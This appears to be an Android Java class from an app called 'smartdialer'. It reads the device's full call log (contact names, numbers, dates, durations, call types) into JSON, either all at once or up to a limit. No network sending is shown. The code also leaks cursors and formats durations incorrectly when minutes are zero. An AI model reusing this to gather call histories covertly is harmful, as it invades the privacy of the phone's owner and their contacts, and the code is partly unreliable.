package com.example.smartdialer.calls;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallsManager {
    public static JSONObject getCallsLogs(Context context) {

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = context.getContentResolver().query(allCalls, null, null, null, null);
            int nameind = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int number = cur.getColumnIndex(CallLog.Calls.NUMBER);
            int typeind = cur.getColumnIndex(CallLog.Calls.TYPE);
            int dateind = cur.getColumnIndex(CallLog.Calls.DATE);
            int durationind = cur.getColumnIndex(CallLog.Calls.DURATION);
            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(number);
                String name = cur.getString(nameind);
                String duration = cur.getString(durationind);
                String date = cur.getString(dateind);

                int type = Integer.parseInt(cur.getString(typeind));


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("date", date);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

    public static JSONArray getCallDetails(Context context, int limit) {
        JSONArray list = new JSONArray();
        try {
            int i = 1;
            //String query = "( " + CallLog.Calls.DATE + " >= " + from +" AND " + CallLog.Calls.DATE + " <= " + to + ")";
            String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
            Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                    null,null, strOrder );
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            while (managedCursor.moveToNext()) {
                String mName = managedCursor.getString(name);
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                long callDate = Long.parseLong(managedCursor.getString(date));
                String callDayTime = new SimpleDateFormat("dd MMM yyyy hh:mm a", Locale.ENGLISH).format(new Date(callDate));
                String callDuration = managedCursor.getString(duration);
                JSONObject call = new JSONObject();

                call.put("phoneNo", phNumber);
                call.put("name", mName);
                call.put("duration", getTime(callDuration));
                call.put("date", callDayTime);
                call.put("type", callType);
                list.put(call);
                i++;
                if (i > limit){
                    break;
                }
            }
            //managedCursor.close();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return list;

    }

    private static String getTime(String second) {
        int totalsec = Integer.parseInt(second);
        String fineTime = "";
        int hours = totalsec / 3600;
        int minutes = (totalsec % 3600) / 60;
        int seconds = totalsec % 60;
        if (minutes == 00) {
            fineTime = String.format("%02ds", seconds);
        } else if (hours == 00) {
            fineTime = String.format("%02dm %02ds", minutes, seconds);
        } else {
            fineTime = String.format("%02dh %02dm %02ds", hours, minutes, seconds);
        }
        return fineTime;
    }
}
